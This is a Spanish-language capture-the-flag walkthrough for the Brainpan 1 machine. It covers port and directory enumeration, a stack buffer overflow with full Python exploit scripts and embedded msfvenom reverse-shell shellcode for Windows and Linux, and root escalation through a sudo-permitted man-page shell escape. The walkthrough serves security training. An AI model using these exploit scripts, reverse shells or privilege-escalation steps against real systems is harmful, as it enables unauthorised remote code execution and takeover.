# Brainpan 1
## Enumeración

>Al realizarle un ICMP ECHO Request podemos observar que se trata de una máquina Linux debido a su TTL que tiende a 64:

```bash
ping -c 3 IP
```

![Pasted image 20240821222952](https://github.com/user-attachments/assets/ecb9e614-9d07-4636-817e-7fbf17796654)

>Ahora, vamos a proceder a realizar un escaneo de puertos abiertos a la máquina para observar los posibles servicios expuestos que posee:

```bash
nmap -p- --open -sS -Pn -n -vvv --min-rate 5000 IP
```

![Pasted image 20240821223003](https://github.com/user-attachments/assets/f9719821-b286-4799-aee8-1c38b41f107f)

>Ahora realizaremos un escaneo más exhaustivo empleando scripts de reconocimiento para averiguar la versión de los servicios que corren en la máquina y cosas interesantes acerca de ellos:

```bash
nmap -p[ListaPuertos] -sCV -Pn -n -vvv IP
```

![Pasted image 20240821223129](https://github.com/user-attachments/assets/9195709a-5bb5-40be-bd21-8700aa9ff8c4)

>Como el puerto TCP 10000 está alojando un servicio web, vamos a enumerar posibles directorios mediante la herramienta **gobuster**:

```bash
gobuster dir -u "http://IP:10000" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt
```

![Pasted image 20240821223346](https://github.com/user-attachments/assets/f0c1ea71-71ff-4a74-9038-83faaff645b3)

>Vamos a entrar al directorio bin que se encuentra en el servidor web y encontramos un ejecutable, lo descargaremos y procederemos a realizar pruebas de ingeniería inversa con él.

![Pasted image 20240821223416](https://github.com/user-attachments/assets/3f76a03c-b7f9-4ee5-a74d-95b385db3d2f)

>Una vez hecho esto, se lo compartiremos a una máquina Windows 7 para mediante Inmunity Debugger comenzar a realizar el proceso de ingeniería inversa.

>Una vez lancemos el binario y lo unamos con inmunity debugger deberemos conectarnos a él mediante netcat para interactuar con él:

```bash
nc IP 9999
```

>Vamos a tratar de desbordar el buffer agregando una gran cantidad de contenido para ver si llega a sobreescribir el registro EIP debido a su mal manejo de la memoria:

![Pasted image 20240821230518](https://github.com/user-attachments/assets/5b622ba8-2b67-434a-822f-4c5867085ee1)

>Y como podemos ver, el registro EIP vale 41414141 que es la equivalencia a AAAA en hexadecimal:

![Pasted image 20240821230615](https://github.com/user-attachments/assets/3c1a685f-dbc7-4236-a58d-e95949ea2452)

## Explotación

>Ahora que sabemos que podemos sobreescribir el registro EIP, vamos a averiguar en qué punto exacto es donde esto ocurre, para ello emplearemos una utilidad de metasploit que nos permitirá crear un patrón para, sabiendo el valor del EIP, conseguir averiguar el número de caracteres a poner antes de que se sobreescriba el registro EIP:

```bash
msf-pattern-create -l 1000
```

![Pasted image 20240821231838](https://github.com/user-attachments/assets/5e8e68fb-d733-4b7b-aebc-3d59abbc073c)

>Como podemos ver, el registro EIP tras lanzar el patrón tiene como valor 35724134, vamos a tratar de emplear la utilidad de metasploit que comparará el patrón con el resultado para decirnos el offset:

![Pasted image 20240821231903](https://github.com/user-attachments/assets/b8be39cc-bfcb-4968-82fb-d58cfbf32b38)

>Para ello, indicaremos la longitud del patrón y el valor del registro EIP:

```bash
msf-pattern_offset -l 1000 -q 35724134
```

![Pasted image 20240821232018](https://github.com/user-attachments/assets/eb53f413-6c7a-42bc-a88f-c2aa216b5ca6)

>Nos ha dicho que el offset sería de 524 por lo que vamos a comprobarlo con un patrón personalizado que tratará de escribir solo 4 B en el registro EIP y varias C para ver si llega directamente a la pila lo que siga después del EIP:

```bash
python3 -c 'print("A"*524 + "B"*4 + "C"*100)'
```

![Pasted image 20240821232129](https://github.com/user-attachments/assets/ad37a758-1979-4f3a-96a6-c74b63d0be73)

>Si lo lanzamos en la aplicación, podremos ver que el registro EIP vale exactamente 42424242 que equivale a nuestras 4 B:

![Pasted image 20240821232338](https://github.com/user-attachments/assets/f9706b20-48bb-4be0-b18f-34e9e3699833)
![Pasted image 20240821232412](https://github.com/user-attachments/assets/6ab9a610-f02d-4960-8cd3-81d86926f595)

>Ahora tocará obtener los badchars que no soporta la aplicación. Vamos a excluir los siguientes badchars ya que son los más comunes: **\x00\x0a\x0d**

>Ahora, vamos a generar el shellcode que vamos a ejecutar en la pila al realizar el Buffer Overflow, yo emplearé una reverse shell de windows por TCP:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.42 LPORT=443 -f py -v shellcode -b "\x00\x0a\x0d"
```

![Pasted image 20240821233000](https://github.com/user-attachments/assets/9abafe06-a39a-4ac5-9817-04d01386ad74)


>Para llevar a cabo la explotación, deberemos crear un script en python como el siguiente:

```python
#!/usr/bin/python3

import socket

offset = 524
before_eip = b"A" * offset

eip = b"\xf3\x12\x17\x31" # <--- 0x311712f3 - JMP ESP

shellcode =  b""
shellcode += b"\xdb\xdf\xd9\x74\x24\xf4\x5a\xbb\x1a\x94\x0e"
shellcode += b"\xa9\x33\xc9\xb1\x52\x31\x5a\x17\x83\xc2\x04"
shellcode += b"\x03\x40\x87\xec\x5c\x88\x4f\x72\x9e\x70\x90"
shellcode += b"\x13\x16\x95\xa1\x13\x4c\xde\x92\xa3\x06\xb2"
shellcode += b"\x1e\x4f\x4a\x26\x94\x3d\x43\x49\x1d\x8b\xb5"
shellcode += b"\x64\x9e\xa0\x86\xe7\x1c\xbb\xda\xc7\x1d\x74"
shellcode += b"\x2f\x06\x59\x69\xc2\x5a\x32\xe5\x71\x4a\x37"
shellcode += b"\xb3\x49\xe1\x0b\x55\xca\x16\xdb\x54\xfb\x89"
shellcode += b"\x57\x0f\xdb\x28\xbb\x3b\x52\x32\xd8\x06\x2c"
shellcode += b"\xc9\x2a\xfc\xaf\x1b\x63\xfd\x1c\x62\x4b\x0c"
shellcode += b"\x5c\xa3\x6c\xef\x2b\xdd\x8e\x92\x2b\x1a\xec"
shellcode += b"\x48\xb9\xb8\x56\x1a\x19\x64\x66\xcf\xfc\xef"
shellcode += b"\x64\xa4\x8b\xb7\x68\x3b\x5f\xcc\x95\xb0\x5e"
shellcode += b"\x02\x1c\x82\x44\x86\x44\x50\xe4\x9f\x20\x37"
shellcode += b"\x19\xff\x8a\xe8\xbf\x74\x26\xfc\xcd\xd7\x2f"
shellcode += b"\x31\xfc\xe7\xaf\x5d\x77\x94\x9d\xc2\x23\x32"
shellcode += b"\xae\x8b\xed\xc5\xd1\xa1\x4a\x59\x2c\x4a\xab"
shellcode += b"\x70\xeb\x1e\xfb\xea\xda\x1e\x90\xea\xe3\xca"
shellcode += b"\x37\xba\x4b\xa5\xf7\x6a\x2c\x15\x90\x60\xa3"
shellcode += b"\x4a\x80\x8b\x69\xe3\x2b\x76\xfa\xcc\x04\x79"
shellcode += b"\xd0\xa4\x56\x79\x25\x8e\xde\x9f\x4f\xe0\xb6"
shellcode += b"\x08\xf8\x99\x92\xc2\x99\x66\x09\xaf\x9a\xed"
shellcode += b"\xbe\x50\x54\x06\xca\x42\x01\xe6\x81\x38\x84"
shellcode += b"\xf9\x3f\x54\x4a\x6b\xa4\xa4\x05\x90\x73\xf3"
shellcode += b"\x42\x66\x8a\x91\x7e\xd1\x24\x87\x82\x87\x0f"
shellcode += b"\x03\x59\x74\x91\x8a\x2c\xc0\xb5\x9c\xe8\xc9"
shellcode += b"\xf1\xc8\xa4\x9f\xaf\xa6\x02\x76\x1e\x10\xdd"
shellcode += b"\x25\xc8\xf4\x98\x05\xcb\x82\xa4\x43\xbd\x6a"
shellcode += b"\x14\x3a\xf8\x95\x99\xaa\x0c\xee\xc7\x4a\xf2"
shellcode += b"\x25\x4c\x7a\xb9\x67\xe5\x13\x64\xf2\xb7\x79"
shellcode += b"\x97\x29\xfb\x87\x14\xdb\x84\x73\x04\xae\x81"
shellcode += b"\x38\x82\x43\xf8\x51\x67\x63\xaf\x52\xa2"

after_eip = b"\x90"*32 + shellcode # ESP empleando 32 NOPs

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.38", 9999))
s.send(payload)
s.close
```

>Ahora vamos a encontrar el OpCode correspondiente a la acción JMP ESP para poder hacer que el EIP apunte a la pila y esta sea la que ejecute nuestro shellcode:

```python
!mona jmp -r esp
```

![Pasted image 20240821235435](https://github.com/user-attachments/assets/bfdf506a-cdf1-45e1-8ace-6f416506e115)

>Una vez obtenido el OpCode deberemos pasarlo a little endian, para ello deberemos de dos en dos dígitos desde el final hacia atrás ir iterando por los valores separándolos por `\x` como se muestra a continuación:

```python
0x311712f3 ----> \xf3\x12\x17\x31
```

>Una vez montado el script, solo deberemos agregarle permisos de ejecución, escuchar mediante netcat y ejecutar el script y obtendremos una reverse shell de la máquina en la que estamos realizando el proceso de ingeniería inversa:

```bash
nc -nlvp 443
chmod +x exploit.py
python3 exploit.py
```
![Pasted image 20240830155713](https://github.com/user-attachments/assets/5b9c9898-ec5f-459a-920b-3a1762baeb5f)


>Ahora que hemos visto que podemos ejecutar código debido a la vulnerabilidad en el manejo de la memoria de la aplicación, deberemos modificarlo para apuntar a la máquina víctima. Para ello, vamos a emplear un nuevo shellcode para pasar por la VPN:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.3.105 LPORT=443 -f py -v shellcode -b "\x00\x0a\x0d"
```

>Y realizaremos un cambio al script anterior, cambiando el shellcode y la IP a la que apunta el **s.connect**:

```python
#!/usr/bin/python3

import socket

offset = 524
before_eip = b"A" * offset

eip = b"\xf3\x12\x17\x31" # <--- 0x311712f3 - JMP ESP

shellcode =  b""
shellcode += b"\xda\xdb\xba\x97\xa3\x09\x01\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x52\x31\x56\x17\x03\x56\x17"
shellcode += b"\x83\x79\x5f\xeb\xf4\x79\x48\x6e\xf6\x81\x89"
shellcode += b"\x0f\x7e\x64\xb8\x0f\xe4\xed\xeb\xbf\x6e\xa3"
shellcode += b"\x07\x4b\x22\x57\x93\x39\xeb\x58\x14\xf7\xcd"
shellcode += b"\x57\xa5\xa4\x2e\xf6\x25\xb7\x62\xd8\x14\x78"
shellcode += b"\x77\x19\x50\x65\x7a\x4b\x09\xe1\x29\x7b\x3e"
shellcode += b"\xbf\xf1\xf0\x0c\x51\x72\xe5\xc5\x50\x53\xb8"
shellcode += b"\x5e\x0b\x73\x3b\xb2\x27\x3a\x23\xd7\x02\xf4"
shellcode += b"\xd8\x23\xf8\x07\x08\x7a\x01\xab\x75\xb2\xf0"
shellcode += b"\xb5\xb2\x75\xeb\xc3\xca\x85\x96\xd3\x09\xf7"
shellcode += b"\x4c\x51\x89\x5f\x06\xc1\x75\x61\xcb\x94\xfe"
shellcode += b"\x6d\xa0\xd3\x58\x72\x37\x37\xd3\x8e\xbc\xb6"
shellcode += b"\x33\x07\x86\x9c\x97\x43\x5c\xbc\x8e\x29\x33"
shellcode += b"\xc1\xd0\x91\xec\x67\x9b\x3c\xf8\x15\xc6\x28"
shellcode += b"\xcd\x17\xf8\xa8\x59\x2f\x8b\x9a\xc6\x9b\x03"
shellcode += b"\x97\x8f\x05\xd4\xd8\xa5\xf2\x4a\x27\x46\x03"
shellcode += b"\x43\xec\x12\x53\xfb\xc5\x1a\x38\xfb\xea\xce"
shellcode += b"\xef\xab\x44\xa1\x4f\x1b\x25\x11\x38\x71\xaa"
shellcode += b"\x4e\x58\x7a\x60\xe7\xf3\x81\xe3\x02\x0c\x8a"
shellcode += b"\x9a\x7a\x0e\x8c\x5d\xc0\x87\x6a\x37\x26\xce"
shellcode += b"\x25\xa0\xdf\x4b\xbd\x51\x1f\x46\xb8\x52\xab"
shellcode += b"\x65\x3d\x1c\x5c\x03\x2d\xc9\xac\x5e\x0f\x5c"
shellcode += b"\xb2\x74\x27\x02\x21\x13\xb7\x4d\x5a\x8c\xe0"
shellcode += b"\x1a\xac\xc5\x64\xb7\x97\x7f\x9a\x4a\x41\x47"
shellcode += b"\x1e\x91\xb2\x46\x9f\x54\x8e\x6c\x8f\xa0\x0f"
shellcode += b"\x29\xfb\x7c\x46\xe7\x55\x3b\x30\x49\x0f\x95"
shellcode += b"\xef\x03\xc7\x60\xdc\x93\x91\x6c\x09\x62\x7d"
shellcode += b"\xdc\xe4\x33\x82\xd1\x60\xb4\xfb\x0f\x11\x3b"
shellcode += b"\xd6\x8b\x21\x76\x7a\xbd\xa9\xdf\xef\xff\xb7"
shellcode += b"\xdf\xda\x3c\xce\x63\xee\xbc\x35\x7b\x9b\xb9"
shellcode += b"\x72\x3b\x70\xb0\xeb\xae\x76\x67\x0b\xfb"

after_eip = b"\x90"*32 + shellcode # ESP empleando 32 NOPs

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.240.207", 9999))
s.send(payload)
s.close
```

>Si nos ponemos en escucha con netcat y lanzamos el script, podremos ver que hemos ganado acceso a la máquina víctima:

![Pasted image 20240830160217](https://github.com/user-attachments/assets/dd0fcbd8-60f0-4274-822b-ed1a23d1a119)

>Ahora, deberemos saltar a la máquina linux real que está cargando el subsistema de Windows, por lo que deberemos modificar el script del buffer overflow para tratar de entablarnos una reverse shell pero empleando un shellcode para Linux x86:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.8.3.105 LPORT=443 -f py -v shellcode -b "\x00\x0a\x0d"
```

>Script modificado con el shellcode correspondiente a una reverse shell para Linux:

```python
#!/usr/bin/python3

import socket

offset = 524
before_eip = b"A" * offset

eip = b"\xf3\x12\x17\x31" # <--- 0x311712f3 - JMP ESP

shellcode =  b""
shellcode += b"\xd9\xcd\xd9\x74\x24\xf4\xbd\xd6\x33\xf5\x5a"
shellcode += b"\x5e\x33\xc9\xb1\x12\x31\x6e\x17\x03\x6e\x17"
shellcode += b"\x83\x38\xcf\x17\xaf\xf5\xeb\x2f\xb3\xa6\x48"
shellcode += b"\x83\x5e\x4a\xc6\xc2\x2f\x2c\x15\x84\xc3\xe9"
shellcode += b"\x15\xba\x2e\x89\x1f\xbc\x49\xe1\x95\x36\xa9"
shellcode += b"\x98\xc1\x44\xad\x5b\xa9\xc0\x4c\xeb\xab\x82"
shellcode += b"\xdf\x58\x87\x20\x69\xbf\x2a\xa6\x3b\x57\xdb"
shellcode += b"\x88\xc8\xcf\x4b\xf8\x01\x6d\xe5\x8f\xbd\x23"
shellcode += b"\xa6\x06\xa0\x73\x43\xd4\xa3"

after_eip = b"\x90"*32 + shellcode # ESP empleando 32 NOPs

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.240.207", 9999))
s.send(payload)
s.close
```

>Ahora, podemos ver que hemos ganado acceso a la máquina original y, como podemos ver, se trata de un Ubuntu quantal:

```bash
lsb_release -a
```

![Pasted image 20240822091542](https://github.com/user-attachments/assets/bc0c29c3-e1b4-4e73-b258-21cc6a17a995)



>Ahora vamos a realizar un tratamiento de la TTY para obtener una shell 100% interactiva pudiendo emplear shortcuts:

```bash
script /dev/null -c bash
Ctrl+Z
stty size
stty -echo raw; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows numFilas columns numColumnas
```

# Escalada de privilegios

>Si empleamos el siguiente comando, podremos ver que el usuario puck puede lanzar el binario anansi_util como root sin proporcionar contraseña:

```bash
sudo -l
```

![Pasted image 20240822092238](https://github.com/user-attachments/assets/09a1fa6d-437b-424d-9d3b-9122c6f05200)

>Como podemos ver, esta utilidad nos lanza un manual de un comando de la siguiente forma, por lo que como quien lanza el comando será root podremos escalar privilegios gracias a la ventana de manual:

```bash
sudo /home/anansi/bin/anansi_util manual ls
```

![Pasted image 20240822092323](https://github.com/user-attachments/assets/a105df1d-4a8a-4821-b970-2641fa0f1b29)

>Si una vez abierto el manual, escribimos lo siguiente, conseguiremos una shell como el usuario root:

```bash
!/bin/bash
```

![Pasted image 20240822092346](https://github.com/user-attachments/assets/5f1e97c0-63ea-4857-ad30-95db152de5eb)

>Una vez hecho esto, podemos ver que hemos obtenido una shell como el usuario root:

![Pasted image 20240822092400](https://github.com/user-attachments/assets/1aaa41ad-6483-4993-8900-7981b32ddeb3)

>Por último, la flag se encuentra en el directorio de root:

![Pasted image 20240822092434](https://github.com/user-attachments/assets/5b099bc5-f45f-4ecb-ab1c-c6a7c3b3ecb4)


